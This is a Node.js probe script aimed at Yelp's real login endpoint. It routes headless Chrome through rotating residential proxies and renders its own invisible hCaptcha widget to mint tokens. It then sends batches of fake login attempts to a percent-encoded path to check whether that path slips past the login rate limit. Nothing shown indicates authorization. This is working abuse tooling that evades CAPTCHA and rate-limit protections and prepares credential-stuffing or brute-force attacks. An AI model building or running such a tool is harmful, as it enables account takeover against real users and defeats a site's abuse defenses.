// testpace/pace-enc2.js - is the percent-encoded /login path (a) not rate limited and
// (b) does it reach the real password handler reliably?
//
// Order matters: 20 encoded POSTs first, then one normal POST on a fresh bucket.
//   normal 200 => encoded POSTs were not counted at all
//   normal 429 => encoded POSTs share the same 15/min bucket
//
// env: PU_BASE PW [PU] [SESSID] [BID=8]

const http = require('http');
const net = require('net');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');

const BID = parseInt(process.env.BID || '8', 10);
const PU_BASE = process.env.PU_BASE, PW = process.env.PW;
const SESS = process.env.SESSID || ('pf' + BID + Math.floor(Math.random() * 100000));
const PU = process.env.PU || (PU_BASE + '-sessid-' + SESS + '-sesstime-1800');
const PH = process.env.PROXY_HOST || 'pr.oxylabs.io';
const PP = parseInt(process.env.PROXY_PORT || '7777', 10);
const SITEKEY = process.env.SITEKEY || '6660d4df-1884-4ac6-a933-e5f3bd460946';
const AUTH = 'Basic ' + Buffer.from(PU + ':' + PW).toString('base64');
const LP = 9790 + BID, CP = 10190 + BID;
const OUT = process.env.OUT || path.join(__dirname, 'enc2-' + SESS + '.jsonl');

fs.writeFileSync(OUT, '');
const sleep = ms => new Promise(r => setTimeout(r, ms));
const rec = o => { fs.appendFileSync(OUT, JSON.stringify(o) + '\n'); console.log(JSON.stringify(o)); };
process.on('uncaughtException', e => { try { rec({ event: 'abort', why: 'crash', err: String(e && e.message || e) }); } catch (_) {} process.exit(3); });

const relay = http.createServer((q, s) => {
  s.on('error', () => {}); q.on('error', () => {});
  try {
    const u = new URL(q.url);
    const pr = http.request({ host: u.hostname, port: u.port || 80, method: q.method, path: u.pathname + u.search, headers: Object.assign({}, q.headers, { host: u.host }) }, r => { s.writeHead(r.statusCode, r.headers); r.pipe(s); });
    pr.on('error', () => s.destroy()); q.pipe(pr);
  } catch (e) { s.destroy(); }
});
relay.on('clientError', (e, s) => { try { s.destroy(); } catch (_) {} });
relay.on('connect', (req, cs, head) => {
  const sock = net.connect(PP, PH, () => sock.write('CONNECT ' + req.url + ' HTTP/1.1\r\nHost: ' + req.url + '\r\nProxy-Authorization: ' + AUTH + '\r\n\r\n'));
  let buf = Buffer.alloc(0);
  function onData(d) {
    buf = Buffer.concat([buf, d]);
    const i = buf.indexOf('\r\n\r\n'); if (i < 0) return;
    sock.removeListener('data', onData);
    const rest = buf.slice(i + 4);
    const m = buf.slice(0, i).toString().match(/^HTTP\/1\.[01]\s+(\d+)/);
    if (!m || parseInt(m[1], 10) !== 200) { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} sock.destroy(); return; }
    cs.write('HTTP/1.1 200 Connection Established\r\n\r\n');
    if (rest.length) cs.write(rest);
    sock.pipe(cs); cs.pipe(sock);
    if (head && head.length) sock.write(head);
    sock.on('error', () => cs.destroy()); cs.on('error', () => sock.destroy());
  }
  sock.on('data', onData);
  sock.on('error', () => { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} });
});

(async () => {
  rec({ event: 'start', sess: SESS });
  await new Promise(r => relay.listen(LP, '127.0.0.1', r));
  const udd = path.join(os.tmpdir(), 'pf-' + Date.now());
  const cdd = path.join(os.tmpdir(), 'yelp-cache', 'probe');
  try { fs.mkdirSync(cdd, { recursive: true }); } catch (e) {}
  const chrome = spawn(process.env.CHROME || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', [
    '--no-first-run', '--no-default-browser-check', '--window-size=900,700', '--lang=en-US',
    '--user-data-dir=' + udd,
    '--disable-background-timer-throttling', '--disable-renderer-backgrounding',
    '--blink-settings=imagesEnabled=false', '--disable-remote-fonts',
    '--disk-cache-dir=' + cdd, '--disk-cache-size=67108864',
    '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP, 'about:blank'
  ], { stdio: 'ignore' });
  let ver = null;
  for (let k = 0; k < 60 && !ver; k++) { await sleep(250); try { ver = await (await fetch('http://127.0.0.1:' + CP + '/json/version')).json(); } catch (e) {} }
  if (!ver) { rec({ event: 'abort', why: 'cdp' }); chrome.kill(); relay.close(); return; }
  const ws = new WebSocket(ver.webSocketDebuggerUrl);
  ws.addEventListener('error', () => {});
  let id = 0; const pend = new Map();
  ws.addEventListener('message', ev => {
    let m; try { m = JSON.parse(ev.data); } catch (e) { return; }
    if (m.method === 'Fetch.requestPaused') { ws.send(JSON.stringify({ id: ++id, method: 'Fetch.failRequest', params: { requestId: m.params.requestId, errorReason: 'BlockedByClient' }, sessionId: m.sessionId })); return; }
    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }
  });
  await new Promise((res, rej) => { ws.addEventListener('open', res); ws.addEventListener('error', rej); });
  const send = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {} })); });
  let sid = null;
  for (let k = 0; k < 60 && !sid; k++) { await sleep(250); const t = await send('Target.getTargets'); if (t && t.result) { const pg = t.result.targetInfos.find(x => x.type === 'page'); if (pg) { const a = await send('Target.attachToTarget', { targetId: pg.targetId, flatten: true }); if (a && a.result) sid = a.result.sessionId; } } }
  if (!sid) { rec({ event: 'abort', why: 'cdp' }); chrome.kill(); relay.close(); return; }
  const sendS = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {}, sessionId: sid })); });
  const ev = e => new Promise(resolve => {
    const mid = Math.floor(Math.random() * 1e9);
    const h = x => { try { const m = JSON.parse(x.data); if (m.id === mid) { ws.removeEventListener('message', h); resolve(m.result && m.result.result ? m.result.result.value : null); } } catch (err) {} };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id: mid, method: 'Runtime.evaluate', params: { expression: e, returnByValue: true, awaitPromise: true }, sessionId: sid }));
    setTimeout(() => resolve(null), 40000);
  });
  await sendS('Page.enable'); await sendS('Network.enable', {});
  await sendS('Emulation.setFocusEmulationEnabled', { enabled: true });
  await sendS('Page.bringToFront', {});
  await sendS('Fetch.enable', { patterns: [
    { urlPattern: '*', resourceType: 'Image', requestStage: 'Request' },
    { urlPattern: '*', resourceType: 'Media', requestStage: 'Request' },
    { urlPattern: '*', resourceType: 'Font', requestStage: 'Request' }] });

  await sendS('Page.navigate', { url: 'https://www.yelp.com/login/' });
  let ok = false;
  for (let k = 0; k < 30; k++) {
    await sleep(1000);
    const s = await ev(`JSON.stringify({f:!!document.getElementById('ajax-login'),h:!!window.hcaptcha,l:document.documentElement.outerHTML.length})`);
    try { const o = JSON.parse(s); if (o && o.f && o.h) { ok = true; break; } } catch (e) {}
  }
  if (!ok) { rec({ event: 'abort', why: 'hydrate' }); chrome.kill(); relay.close(); return; }
  rec({ event: 'widget', armed: await ev(`(function(){ if(!window.hcaptcha) return 'no-api'; var d=document.createElement('div');d.style.display='none';document.body.appendChild(d);window.__wid=window.hcaptcha.render(d,{sitekey:'${SITEKEY}',size:'invisible',callback:function(t){window.__fcTok=t}});return 'own:'+window.__wid; })()`) });
  const mintRaw = () => ev(`new Promise(function(res){var w=window.__wid;window.__fcTok='';try{window.hcaptcha.execute(w)}catch(e){res('');return}var n=0;var iv=setInterval(function(){n++;var t=window.__fcTok||window.hcaptcha.getResponse(w)||'';if(t){clearInterval(iv);res(t)}else if(n>60){clearInterval(iv);res('')}},200)})`);
  const mint = async () => { for (let a = 0; a < 3; a++) { const t = await mintRaw(); if (t) return t; await sleep(1200); } return ''; };
  const csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:''})()`);
  rec({ event: 'csrf', len: csrf.length });
  const post = (url, tag) => {
    const body = new URLSearchParams({ csrftok: csrf, email: tag + '@gmail.com', password: 'WrongPass!7788', hcaptcha_response: '__TOK__' }).toString();
    return ev(`(async function(){var b=${JSON.stringify(body)};var t=window.__lastTok||'';b=b.replace('__TOK__',encodeURIComponent(t));try{var r=await fetch(${JSON.stringify(url)},{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},body:b});var x=await r.text();return JSON.stringify({status:r.status,node:r.headers.get('x-node')||'',rs:r.headers.get('x-routing-service')||'',srv:r.headers.get('server')||'',body:x.slice(0,150)})}catch(e){return JSON.stringify({status:-1,body:String(e)})}})()`);
  };
  async function one(phase, url, tag) {
    const t = await mint();
    if (!t) { rec({ phase, tok: 0 }); return null; }
    await ev(`window.__lastTok=${JSON.stringify(t)}`);
    const tt = Date.now();
    const r = await post(url, tag + Date.now());
    let o = {}; try { o = JSON.parse(r) } catch (e) {}
    rec({ phase, status: o.status, node: o.node, srv: o.srv, body: (o.body || '').slice(0, 80), tokMs: tt ? undefined : undefined });
    return o;
  }

  const enc1 = '/login/%6E%65%77%61%6A%61%78';
  // 1) 20 encoded posts on a fresh bucket
  for (let k = 1; k <= 20; k++) await one('enc' + k, enc1, 'e' + k);
  // 2) normal path right after: counted or not?
  await one('normalAfterEnc', '/login/newajax', 'nA');
  // 3) burn 15 normal, confirm 429
  let burnt = 0;
  for (let k = 0; k < 15; k++) { const o = await one('burn' + (k + 1), '/login/newajax', 'b' + k); if (!o) break; if (o.status !== 200) break; burnt++; }
  rec({ event: 'burned', burnt });
  await one('normalHot', '/login/newajax', 'nH');
  // 4) encoded again while the normal bucket is hot
  for (let k = 1; k <= 5; k++) await one('encHot' + k, enc1, 'h' + k);

  rec({ event: 'summary', sess: SESS });
  try { ws.close(); } catch (e) {}
  try { chrome.kill(); } catch (e) {}
  try { fs.rmSync(udd, { recursive: true, force: true }); } catch (e) {}
  try { relay.close(); } catch (e) {}
  setTimeout(() => process.exit(0), 500);
})();
